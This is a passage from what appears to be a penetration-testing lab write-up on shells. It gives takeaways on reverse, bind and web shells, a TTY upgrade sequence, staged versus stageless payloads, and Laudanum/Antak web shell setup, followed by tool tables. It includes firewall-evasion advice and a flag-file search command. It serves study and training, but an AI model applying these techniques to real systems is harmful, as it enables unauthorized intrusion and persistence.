Get-ChildItem -Path C:\ -Recurse -Include "proof.txt","root.txt","user.txt" -EA SilentlyContinue
```

---

## Key Takeaways

Reverse shells are the default. Use them on almost every target — outbound connections bypass inbound firewall rules and port 443 blends with legitimate HTTPS traffic. Bind shells are situational, for internal pivoting only. Web shells are temporary stepping stones — deploy, stabilise to a reverse shell, then delete within minutes.

The TTY upgrade sequence is something I now run immediately after catching any shell without thinking. A non-TTY shell breaks too many tools to work with comfortably — sudo prompts fail, su fails, signals behave incorrectly. Python3 pty.spawn, background, stty raw -echo, foreground, set TERM and SHELL. This four-step sequence takes twenty seconds and transforms a crippled shell into a fully functional one.

The staged vs stageless distinction matters more than expected. Staged payloads require Metasploit's multi/handler to serve the second stage — catching them with raw Netcat just drops the connection. Stageless payloads contain everything and can be caught by any listener. Knowing which one you generated prevents a lot of silent failures where the exploit runs but nothing arrives on the listener.

Laudanum and Antak eliminate the need to write web shells manually in most situations. Laudanum for quick PHP or ASPX access. Antak when full PowerShell capability is needed on a Windows IIS target. The setup workflow — copy, set IP, strip comments, verify — takes under a minute and produces OPSEC-clean shells ready for deployment.

---

## Tools Reference

| Tool | Purpose | Location on Kali |
|---|---|---|
| nc / ncat | Bind/reverse shell listener, SSL support | Built in |
| socat | Full TTY shell connections | Built in |
| msfconsole | Exploit framework | Built in |
| msfvenom | Payload generation | Built in |
| Laudanum | Pre-built injectable web shells | /usr/share/laudanum/ |
| Antak | PowerShell ASPX web shell | /usr/share/nishang/Antak-WebShell/ |
| Nishang | PowerShell offensive toolkit | /usr/share/nishang/ |
| LinPEAS | Linux privilege escalation enum | /opt/privesc/linpeas.sh |
| WinPEAS | Windows privilege escalation enum | /opt/privesc/winPEASx64.exe |
| LinEnum | Linux enumeration script | /opt/privesc/LinEnum.sh |
| Burp Suite | Web proxy — request interception | Built in |
| impacket-smbserver | SMB file server for Windows transfers | Built in |

## Key Resources

| Resource | URL | Use |
|---|---|---|
| GTFOBins | https://gtfobins.github.io | Linux SUID/sudo escape techniques |
| LOLBAS | https://lolbas-project.github.io | Windows LOLBins reference |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Shell one-liners, bypass techniques |
| HackTricks | https://book.hacktricks.xyz | Comprehensive pentesting reference |
| RevShells | https://revshells.com | Reverse shell generator |
